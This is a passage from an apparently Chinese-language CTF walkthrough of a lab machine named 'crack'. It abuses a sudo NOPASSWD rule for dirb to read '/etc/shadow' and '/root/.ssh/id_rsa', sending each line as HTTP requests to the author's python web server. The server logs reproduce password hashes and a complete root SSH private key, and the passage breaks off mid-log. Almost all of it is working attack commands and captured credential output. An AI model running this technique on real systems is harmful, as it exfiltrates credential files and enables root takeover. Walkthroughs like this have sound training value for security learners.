crack:                                                                                                                                                 \n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin                                                                                   \n                                                                                                                                                                                             \nUser cris may run the following commands on crack:                                                                                                                                           \n    (ALL) NOPASSWD: /usr/bin/dirb                                                                                                                                                            \ncris@crack:~$ ls                                                                                                                                                                             \ncrack.py  user.txt  ziempre.py\ncris@crack:~$ cat ziempre.py                                                                                                                                                                 \n#!/usr/local/lib/python3.7                                                                                                                                                                     \nfrom subprocess import Popen                                                                                                                                                                 \nimport sys                                                                                                                                                                                   \nprogram = '/home/cris/crack.py'                                                                                                                                                              \nwhile True:                                                                                                                                                                                  \n    p = Popen('python3 '+program, shell=True)                                                                                                                                                \n    p.wait()                                                                                                                                                                                 \n                                                                                                                                       \ncris@crack:~$ sudo /usr/bin/dirb http://192.168.205.141 /etc/shadow                                                                                                                          \n                                                                                                                                                                                             \n-----------------                                                                                                                                                                            \nDIRB v2.22                                                                                                                                                                                   \nBy The Dark Raver                                                                                                                                                                            \n-----------------                                                                                                                                                                            \n                                                                                                                                                                                             \nSTART_TIME: Thu Jan 23 09:12:22 2025                                                                                                                                                         \nURL_BASE: http://192.168.205.141/                                                                                                                                                            \nWORDLIST_FILES: /etc/shadow                                                                                                                                                                  \n                                                                                                                                                                                             \n-----------------                                                                                                                                                                            \n                                                                                                                                                                                             \nGENERATED WORDS: 28\n                                                                                                                                                                                             \n---- Scanning URL: http://192.168.205.141/ ----                                                                                                                                              \n\n\n-----------------                                                                                                                                                                            \nEND_TIME: Thu Jan 23 09:12:22 2025                                                                                                                                                           \nDOWNLOADED: 28 - FOUND: 0                                                                                                                                                                    \n```\n\n\u63a5\u6536\u4e00\u4e0b\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ python3 -m http.server 80\nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /randomfile1 HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /frand2 HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /root:$y$j9T$LVT9GIrLdk5L.xns1akJZ1$wmigJ7er07AT/VwIAuYSZ3j94LOCe8EJHC6d2mlZVo3:19515:0:99999:7::: HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /daemon:*:19515:0:99999:7::: HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /bin:*:19515:0:99999:7::: HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /sys:*:19515:0:99999:7::: HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /sync:*:19515:0:99999:7::: HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /games:*:19515:0:99999:7::: HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /man:*:19515:0:99999:7::: HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /lp:*:19515:0:99999:7::: HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /mail:*:19515:0:99999:7::: HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /news:*:19515:0:99999:7::: HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /uucp:*:19515:0:99999:7::: HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /proxy:*:19515:0:99999:7::: HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /www-data:*:19515:0:99999:7::: HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /backup:*:19515:0:99999:7::: HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /list:*:19515:0:99999:7::: HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /irc:*:19515:0:99999:7::: HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /gnats:*:19515:0:99999:7::: HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /nobody:*:19515:0:99999:7::: HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /_apt:*:19515:0:99999:7::: HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /systemd-network:*:19515:0:99999:7::: HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /systemd-resolve:*:19515:0:99999:7::: HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /messagebus:*:19515:0:99999:7::: HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /systemd-timesync:*:19515:0:99999:7::: HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /sshd:*:19515:0:99999:7::: HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /cris:$y$j9T$kFXVxpRhH2ZAeDGNazqRq/$IokBR4XhhyRJOur8YOHu3fF59/0NOHC5AIsvkxXx8..:19515:0:99999:7::: HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /systemd-coredump:!*:19515:::::: HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /shellinabox:*:19515:0:99999:7::: HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /ftp:*:19515:0:99999:7::: HTTP/1.1' 404 -\n\n```\n\n\u6211\u53bb\u8fd9\u4e48\u72e0\uff0c\u81ea\u5b9a\u4e49\u52a0\u5bc6\u7b97\u6cd5\u3002\u6d4b\u8bd5\u8bfb\u53d6`.bash_history`\n\n```bash\ncris@crack:~$ sudo /usr/bin/dirb http://192.168.205.141 /root/.bash_history                                                                                                                  \n                                                                                                                                                                                             \n-----------------                                                                                                                                                                            \nDIRB v2.22                                                                                                                                                                                   \nBy The Dark Raver                                                                                                                                                                            \n-----------------                                                                                                                                                                            \n                                                                                                                                                                                             \nSTART_TIME: Thu Jan 23 09:16:41 2025                                                                                                                                                         \nURL_BASE: http://192.168.205.141/                                                                                                                                                            \nWORDLIST_FILES: /root/.bash_history                                                                                                                                                          \n                                                                                                                                                                                             \n-----------------                                                                                                                                                                            \n                                                                                                                                                                                             \nGENERATED WORDS: 0\n                                                                                                                                                                                             \n---- Scanning URL: http://192.168.205.141/ ----                                                                                                                                              \n\n\n-----------------                                                                                                                                                                            \nEND_TIME: Thu Jan 23 09:16:41 2025                                                                                                                                                           \nDOWNLOADED: 0 - FOUND: 0                                                                                                                                                                     \n```\n\n\u518d\u8bd5\u8bd5`id_rsa`\n\n```bash\ncris@crack:~$ sudo /usr/bin/dirb http://192.168.205.141 /root/.ssh/id_rsa                                                                                                                    \n                                                                                                                                                                                             \n-----------------                                                                                                                                                                            \nDIRB v2.22                                                                                                                                                                                   \nBy The Dark Raver                                                                                                                                                                            \n-----------------                                                                                                                                                                            \n                                                                                                                                                                                             \nSTART_TIME: Thu Jan 23 09:19:00 2025                                                                                                                                                         \nURL_BASE: http://192.168.205.141/                                                                                                                                                            \nWORDLIST_FILES: /root/.ssh/id_rsa                                                                                                                                                            \n                                                                                                                                                                                             \n-----------------                                                                                                                                                                            \n                                                                                                                                                                                             \nGENERATED WORDS: 38\n                                                                                                                                                                                             \n---- Scanning URL: http://192.168.205.141/ ----                                                                                                                                              \n\n\n-----------------                                                                                                                                                                            \nEND_TIME: Thu Jan 23 09:19:00 2025                                                                                                                                                           \nDOWNLOADED: 38 - FOUND: 0                                                                                                                                                                    \n```\n\n\u63a5\u6536\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ python3 -m http.server 80\nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /randomfile1 HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /frand2 HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /-----BEGIN HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /NhAAAAAwEAAQAAAYEAxBvRe3EH67y9jIt2rwa79tvPDwmb2WmYv8czPn4bgSCpFmhDyHwn HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /b0IUyyw3iPQ3LlTYyz7qEc2vaj1xqlDgtafvvtJ2EJAJCFy5osyaqbYKgAkGkQMzOevdGt HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /xNQ8NxRO4/bC1v90lUrhyLi/ML5B4nak+5vLFJi8NlwXMQJ/xCWZg5+WOLduFp4VvHlwAf HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /tDh2C+tJp2hqusW1jZRqSXspCfKLPt/v7utpDTKtofxFvSS55MFciju4dIaZLZUmiqoD4k HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET //+FwJbMna8iPwmvK6n/2bOsE1+nyKbkbvDG5pjQ3VBtK23BVnlxU4frFrbicU+VtkClfMu HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /yp7muWGA1ydvYUruoOiaURYupzuxw25Rao0Sb8nW1qDBYH3BETPCypezQXE22ZYAj0ThSl HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /Kn2aZN/8xWAB+/t96TcXogtSbQw/eyp9ecmXUpq5i1kBbFyJhAJs7x37WM3/Cb34a/6v8c HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /9rMjGl9HMZFDwswzAGrvPOeroVB/TpZ+UBNGE1znAAAFgC5UADIuVAAyAAAAB3NzaC1yc2 HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /EAAAGBAMQb0XtxB+u8vYyLdq8Gu/bbzw8Jm9lpmL/HMz5+G4EgqRZoQ8h8J29CFMssN4j0 HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /Ny5U2Ms+6hHNr2o9capQ4LWn777SdhCQCQhcuaLMmqm2CoAJBpEDMznr3RrcTUPDcUTuP2 HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /wtb/dJVK4ci4vzC+QeJ2pPubyxSYvDZcFzECf8QlmYOflji3bhaeFbx5cAH7Q4dgvrSado HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /arrFtY2Uakl7KQnyiz7f7+7raQ0yraH8Rb0kueTBXIo7uHSGmS2VJoqqA+JP/hcCWzJ2vI HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /j8Jryup/9mzrBNfp8im5G7wxuaY0N1QbSttwVZ5cVOH6xa24nFPlbZApXzLsqe5rlhgNcn HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /b2FK7qDomlEWLqc7scNuUWqNEm/J1tagwWB9wREzwsqXs0FxNtmWAI9E4UpSp9mmTf/MVg HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /Afv7fek3F6ILUm0MP3sqfXnJl1KauYtZAWxciYQCbO8d+1jN/wm9+Gv+r/HPazIxpfRzGR HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /Q8LMMwBq7zznq6FQf06WflATRhNc5wAAAAMBAAEAAAGAeX9uopbdvGx71wZUqo12iLOYLg HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /3a87DbhP2KPw5sRe0RNSO10xEwcVq0fUfQxFXhlh/VDN7Wr98J7b1RnZ5sCb+Y5lWH9iz2 HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /m6qvDDDNJZX2HWr6GX+tDhaWLt0MNY5xr64XtxLTipZxE0n2Hueel18jNldckI4aLbAKa/ HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /a4rL058j5AtMS6lBWFvqxZFLFr8wEECdBlGoWzkjGJkMTBsPLP8yzEnlipUxGgTR/3uSMN HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /peiKDzLI/Y+QcQku/7GmUIV4ugP0fjMnz/XcXqe6GVNX/gvNeT6WfKPCzcaXiF4I2i228u HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /TB9Ga5PNU2nYzJAQcAVvDwwC4IiNsDTdQY+cSOJ0KCcs2cq59EaOoZHY6Od88900V3MKFG HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /TwielzW1Nqq1ltaQYMtnILxzEeXJFp6LlqFTF4Phf/yUyK04a6mhFg3kJzsxE+iDOVH28D HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /Unj2OgO53KJ2FdLBHkUDlXMaDsISuizi0aj2MnhCryfHefhIsi1JdFyMhVuXCzNGUBAAAA HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /wQDlr9NWE6q1BovNNobebvw44NdBRQE/1nesegFqlVdtKM61gHYWJotvLV79rjjRfjnGHo HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /0MoSXZXiC/0/CSfe6Je7unnIzhiA85jSe/u2dIviqItTc2CBRtOZl7Vrflt7lasT7J1WAO HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /1ROwaN5uL26gIgtf/Y7Rhi0wFPN289UI2gjeVQKhXBObVm3qY7yZh8JpLPH5w0Xeuo20sP HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /WchZl0D8KSZUKhlPU6Pibqmj9bAAm7hwFecuQMeS+nxg1qIGYAAADBAOZ1XurOyyH9RWIo HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /0sTQ3d/kJNgTNHAs4Y0SxSOejC+N3tEU33GU3P+ppfHYy595rX7MX4o3gqXFpAaHRIAupr HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /DbenB1HQW4o6Gg+SF2GWPAQeuDbCsLM9P8XOiQIjTuCvYwHUdFD7nWMJ5Sqr6EeBV+CYw1 HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /Tg5PIU3FsnN5D3QOHVpGNo2qAvi+4CD0BC5fxOs6cZ1RBqbJ1kanw1H6fF8nRRBds+26Bl HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET //RGZHTBPLVenhNmWN2fje3GDBqVeIbZwAAAMEA2dfdjpefYEgtF0GMC9Sf5UzKIEKQMzoh HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /oxY6YRERurpcyYuSa/rxIP2uxu1yjIIcO4hpsQaoipTM0T9PS56CrO+FN9mcIcXCj5SVEq HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /2UVzu9LS0PdqPmniNmWglwvAbkktcEmbmCLYoh5GBxm9VhcL69dhzMdVe73Z9QhNXnMDlf HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /6xpD9lHWyp+ocD/meYC7V8aio/W9VxL25NlYwdFyCgecd/rIJQ+tGPXoqXIKrf5lVrVtFC HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /s8IoeeQHSidUKBAAAACnJvb3RAY3JhY2s= HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /-----END HTTP/1.1' 404 -\n\n```\n\n\u6211\u4eec\u63d0\u53d6\u4e00\u4e0b\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ cat tmp \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ python3 -m http.server 80\nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /randomfile1 HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /frand2 HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /-----BEGIN HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /NhAAAAAwEAAQAAAYEAxBvRe3EH67y9jIt2rwa79tvPDwmb2WmYv8czPn4bgSCpFmhDyHwn HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /b0IUyyw3iPQ3LlTYyz7qEc2vaj1xqlDgtafvvtJ2EJAJCFy5osyaqbYKgAkGkQMzOevdGt HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /xNQ8NxRO4/bC1v90lUrhyLi/ML5B4nak+5vLFJi8NlwXMQJ/xCWZg5+WOLduFp4VvHlwAf HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /tDh2C+tJp2hqusW1jZRqSXspCfKLPt/v7utpDTKtofxFvSS55MFciju4dIaZLZUmiqoD4k HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET //+FwJbMna8iPwmvK6n/2bOsE1+nyKbkbvDG5pjQ3VBtK23BVnlxU4frFrbicU+VtkClfMu HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /yp7muWGA1ydvYUruoOiaURYupzuxw25Rao0Sb8nW1qDBYH3BETPCypezQXE22ZYAj0ThSl HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /Kn2aZN/8xWAB+/t96TcXogtSbQw/eyp9ecmXUpq5i1kBbFyJhAJs7x37WM3/Cb34a/6v8c HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /9rMjGl9HMZFDwswzAGrvPOeroVB/TpZ+UBNGE1znAAAFgC5UADIuVAAyAAAAB3NzaC1yc2 HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /EAAAGBAMQb0XtxB+u8vYyLdq8Gu/bbzw8Jm9lpmL/HMz5+G4EgqRZoQ8h8J29CFMssN4j0 HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /Ny5U2Ms+6hHNr2o9capQ4LWn777SdhCQCQhcuaLMmqm2CoAJBpEDMznr3RrcTUPDcUTuP2 HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /wtb/dJVK4ci4vzC+QeJ2pPubyxSYvDZcFzECf8QlmYOflji3bhaeFbx5cAH7Q4dgvrSado HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /arrFtY2Uakl7KQnyiz7f7+7raQ0yraH8Rb0kueTBXIo7uHSGmS2VJoqqA+JP/hcCWzJ2vI HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /j8Jryup/9mzrBNfp8im5G7wxuaY0N1QbSttwVZ5cVOH6xa24nFPlbZApXzLsqe5rlhgNcn HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /b2FK7qDomlEWLqc7scNuUWqNEm/J1tagwWB9wREzwsqXs0FxNtmWAI9E4UpSp9mmTf/MVg HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /Afv7fek3F6ILUm0MP3sqfXnJl1KauYtZAWxciYQCbO8d+1jN/wm9+Gv+r/HPazIxpfRzGR HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /Q8LMMwBq7zznq6FQf06WflATRhNc5wAAAAMBAAEAAAGAeX9uopbdvGx71wZUqo12iLOYLg HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /3a87DbhP2KPw5sRe0RNSO10xEwcVq0fUfQxFXhlh/VDN7Wr98J7b1RnZ5sCb+Y5lWH9iz2 HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /m6qvDDDNJZX2HWr6GX+tDhaWLt0MNY5xr64XtxLTipZxE0n2Hueel18jNldckI4aLbAKa/ HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /a4rL058j5AtMS6lBWFvqxZFLFr8wEECdBlGoWzkjGJkMTBsPLP8yzEnlipUxGgTR/3uSMN HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /peiKDzLI/Y+QcQku/7GmUIV4ugP0fjMnz/XcXqe6GVNX/gvNeT6WfKPCzcaXiF4I2i228u HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /TB9Ga5PNU2nYzJAQcAVvDwwC4IiNsDTdQY+cSOJ0KCcs2cq59EaOoZHY6Od88900V3MKFG HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /TwielzW1Nqq1ltaQYMtnILxzEeXJFp6LlqFTF4Phf/yUyK04a6mhFg3kJzsxE+iDOVH28D HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /Unj2OgO53KJ2FdLBHkUDlXMaDsISuizi0aj2MnhCryfHefhIsi1JdFyMhVuXCzNGUBAAAA HTTP/1.1' 404 -\n192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found\n192.168.205.143 - - [23/Jan/2025 